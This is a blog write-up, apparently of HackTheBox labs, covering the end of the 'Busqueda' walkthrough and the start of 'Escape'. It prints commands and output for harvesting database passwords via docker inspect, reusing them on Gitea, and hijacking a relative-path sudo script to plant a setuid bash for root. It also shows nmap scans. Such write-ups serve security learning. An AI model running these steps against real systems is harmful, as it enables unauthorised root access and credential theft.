-la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  4 16:08 .</span><br><span class="line">drwxr-xr-x 8 root root 4096 Apr  4 16:08 ..</span><br><span class="line">-rw-r--r-- 1 root root  837 Feb 20 14:06 000-default.conf</span><br><span class="line">-rw-r--r-- 1 root root 6338 Sep 30  2022 default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ cat 000-default.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:5000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:5000/</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteCond %&#123;HTTP_HOST&#125; !^searcher.htb$</span><br><span class="line">        RewriteRule /.* http://searcher.htb/ [R]</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName gitea.searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:3000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:3000/</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了gitea.searcher.htb网址，尝试登录：http或https，或加上端口3000都不行，想到添加域名</p>
<p>切换到主机的终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">添加</span><br><span class="line">10.10.11.208 gitea.searcher.htb</span><br></pre></td></tr></table></figure>

<p>打开浏览器输入<a target="_blank" rel="noopener" href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
<p>点击右上角sign in 出现</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230606214158201.png"></p>
<p>先放一遍。</p>
<p>再次在svc用户界面下，</p>
<p>sudo -l，</p>
<p>关注以下操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)</span><br><span class="line"></span><br><span class="line">     docker-ps     : List running docker containers</span><br><span class="line">     docker-inspect : Inpect a certain docker container</span><br><span class="line">     full-checkup  : Run a full system checkup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对这三个命令依次运行一下，</p>
<p><img src="/../../../Typora/img111/image-20230606222958314.png" alt="image-20230606222958314"></p>
<p>发现docker-inspect 需要配合 -f和容器名才有显示</p>
<p>doker-inspect官方说明得：</p>
<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/inspect/">docs.docker.com&#x2F;engine&#x2F;reference&#x2F;commandline&#x2F;inspect&#x2F;</a></p>
<p><img src="/../../../Typora/img111/image-20230606223323788.png" alt="image-20230606223323788"></p>
<p>例子：</p>
<p><code>docker inspect --format=&#39;&#123;&#123;.LogPath&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p><code>docker inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p>已知在…docker-ps命令下得到容器ID为960873171e2e和f84a6b33fb5a</p>
<p>先看ID1的：</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; 960873171e2e</code>得：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ </span><br><span class="line">sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#x27;&#123;&#123;json .Config&#125;&#125;&#x27; 960873171e2e</span><br><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;22/tcp&quot;:&#123;&#125;,&quot;3000/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:&#123;&quot;/data&quot;:&#123;&#125;,&quot;/etc/localtime&quot;:&#123;&#125;,&quot;/etc/timezone&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有数据库信息为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GITEA__database__USER&#x3D;gitea”,”GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh</p>
</blockquote>
<p>看下另一个ID的</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; f84a6b33fb5a</code></p>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;3306/tcp&quot;:&#123;&#125;,&quot;33060/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:&#123;&quot;/var/lib/mysql&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
</blockquote>
<p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201649485.png"></p>
<p>点击左边的仓库，发现：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201740407.png"></p>
<p>查看第一行脚本：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201759588.png"></p>
<p>前三个脚本对应了，之前的三个命令。</p>
<p>查看第四个脚本内容，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">        except IndexError:</span><br><span class="line">            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">    elif action == &#x27;docker-ps&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]</span><br><span class="line">            print(run_command(arg_list)) </span><br><span class="line">        </span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line"></span><br><span class="line">    elif action == &#x27;full-checkup&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;./full-checkup.sh&#x27;]</span><br><span class="line">            print(run_command(arg_list))</span><br><span class="line">            print(&#x27;[+] Done!&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        action = sys.argv[1]</span><br><span class="line">        if action in actions:</span><br><span class="line">            process_action(action)</span><br><span class="line">        else:</span><br><span class="line">            raise IndexError</span><br><span class="line"></span><br><span class="line">    except IndexError:</span><br><span class="line">        print(f&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        print(&#x27;     docker-ps     : List running docker containers&#x27;)</span><br><span class="line">        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)</span><br><span class="line">        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        exit(1)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>   elif action &#x3D;&#x3D; ‘full-checkup’:<br>       try:<br>           arg_list &#x3D; [‘.&#x2F;full-checkup.sh’]<br>           print(run_command(arg_list))<br>           print(‘[+] Done!’)<br>       except:<br>           print(‘Something went wrong’)<br>           exit(1)</p>
</blockquote>
<p>得：所读取路径不是绝对路径，它在当前目录下找full-checkup.sh的，如果在用户界面中非&#x2F;opt&#x2F;scripts&#x2F;位置下，就会出现报错。</p>
<p>vim full-checkup.sh，内容为：</p>
<blockquote>
<p>#!&#x2F;bin&#x2F;bash<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash<br>chmod +s &#x2F;tmp&#x2F;bash</p>
</blockquote>
<p>这段脚本的作用是创建了一个具有Setuid权限的”&#x2F;tmp&#x2F;bash”文件。通过设置Setuid权限，任何以该文件执行的用户都会暂时获得文件所有者（通常为root）的权限。这意味着，当普通用户执行”&#x2F;tmp&#x2F;bash”时，它将以root用户的权限执行，从而实现了权限提升。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ pwd</span><br><span class="line">/home/svc</span><br><span class="line">-bash-5.1$ vim full-checkup.sh</span><br><span class="line">-bash-5.1$ chmod +x full-checkup.sh</span><br><span class="line">-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br><span class="line">[sudo] password for svc: </span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ ls -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span><br><span class="line"></span><br><span class="line">成功给 /bin/bash 带上suid提权成功</span><br><span class="line">-bash-5.1$ /bin/bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# cd /root</span><br><span class="line">bash-5.1# ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  9 root root 4096 Apr  3 16:01 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .cache</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .config</span><br><span class="line">-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js</span><br><span class="line">-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local</span><br><span class="line">-rw-------  1 root root   50 Feb 20 12:04 .my.cnf</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm</span><br><span class="line">drwxr-xr-x  5 root root 4096 Jun  7 04:20 .pm2</span><br><span class="line">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span><br><span class="line">-rw-r-----  1 root root   33 Jun  7 04:20 root.txt</span><br><span class="line">drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 snap</span><br><span class="line">bash-5.1# cat root.txt</span><br><span class="line">105666c0b97b4202de7dabf892feb190</span><br><span class="line">bash-5.1# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>跟随大佬的wp思路进行，达到提权的目的。</p>
<p>1.nmap扫到端口为80，与22</p>
<p>2.访问80端口位置，进行反弹shell。</p>
<p>3.遍历各文件夹，找到敏感信息</p>
<p>4.拿到普通用户的账号和密码，尝试22端口的ssh连接。</p>
<p>5.由普通用户进行提权。</p>
<p>其中有很多细节有待细究，值得复盘。</p>
<h2 id="2-Escape"><a href="#2-Escape" class="headerlink" title="2.Escape"></a>2.Escape</h2><h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a target="_blank" rel="noopener" href="http://t.csdn.cn/xUqAI">http://t.csdn.cn/xUqAI</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV12k4y1J7zE/?spm_id_from=333.337.search-card.all.click&vd_source=c49e37118f69c7a5b34915b73d1b78ab">hackthebox中等难度靶场escape渗透全过程_哔哩哔哩_bilibili</a></p>
<p>nmap:</p>
<p><code>nmap -p- -sT --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>参数解释：</p>
<p>-p- 所有端口</p>
<p>-sT TCP连接</p>
<p>–min-rate&#x3D;1000 1秒发送1000个请求</p>
<p>-Pn 禁用主机发现</p>
<p>结果为：</p>
<p>53&#x2F;tcp    open  domain<br>88&#x2F;tcp    open  kerberos-sec<br>135&#x2F;tcp   open  msrpc<br>139&#x2F;tcp   open  netbios-ssn<br>389&#x2F;tcp   open  ldap<br>445&#x2F;tcp   open  microsoft-ds<br>464&#x2F;tcp   open  kpasswd5<br>593&#x2F;tcp   open  http-rpc-epmap<br>636&#x2F;tcp   open  ldapssl<br>3269&#x2F;tcp  open  globalcatLDAPssl<br>9389&#x2F;tcp  open  adws<br>49667&#x2F;tcp open  unknown<br>49687&#x2F;tcp open  unknown<br>49705&#x2F;tcp open  unknown<br>49711&#x2F;tcp open  unknown</p>
</blockquote>
<p><code>nmap -p- -sU --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>PORT    STATE SERVICE<br>53&#x2F;udp  open  domain<br>123&#x2F;udp open  ntp</p>
</blockquote>
<p>vim port.txt，将nmap中tcp扫描到的内容复制过去，通过正则过滤拼接出需要的端口号。提取每行”&#x2F;“之前的内容，再拼接即可</p>
<p>awk -F’&#x2F;‘ ‘{print $1}’  ORS&#x3D;’,’  port.txt  | tr -d ‘,’</p>
<blockquote>
<ol>
<li><p><code>awk</code>命令：<code>awk</code>是一个文本处理工具，用于按照指定的规则对文本进行处理。它按行读取输入，并根据给定的规则执行操作。</p>
</li>
<li><p><code>-F&#39;/&#39;</code>：<code>-F</code>选项用于指定字段分隔符。在这个命令中，我们将字段分隔符设置为斜杠（&#x2F;），以便将每行拆分为多个字段。</p>
</li>
<li><p><code>&#39;&#123;print $1&#125;&#39;</code>：这是一个<code>awk</code>的操作部分，指定要执行的操作。<code>$1</code>表示打印第一个字段。</p>
</li>
<li><p>默认情况下，<code>ORS</code>的值是一个换行符（<code>\n</code>），这意味着每个<code>print</code>语句打印的内容将以换行符分隔。但是，您可以通过修改<code>ORS</code>的值来指定不同的分隔符。</p>
</li>
</ol>
<p>  在这种情况下，我们使用<code>ORS=&#39;,&#39;</code>将<code>ORS</code>设置为逗号（<code>,</code>）。这样，当<code>print</code>语句执行时，它将使用逗号作为记录之间的分隔符，而不是默认的换行符。这样就实现了将提取的端口号使用逗号拼接在一起的效果。</p>
<p>  结果为：</p>
<p>  53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711, </p>
</blockquote>
<p><code>nmap -p53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711 -Pn -sT -sC -sV 10.10.11.202</code></p>
<blockquote>
<ul>
<li><code>-sC</code>：这个参数指定在扫描期间运行默认的Nmap脚本。Nmap脚本是一组自动化的测试和攻击脚本，用于探测和利用目标主机上的漏洞或服务配置问题。</li>
<li><code>-sV</code>：这个参数指定在扫描期间进行版本探测。<code>nmap</code>将尝试识别目标主机上运行的服务和应用程序的版本信息。通过识别版本信息，可以更好地了解目标主机上的系统配置和潜在的安全风险。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time:------)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 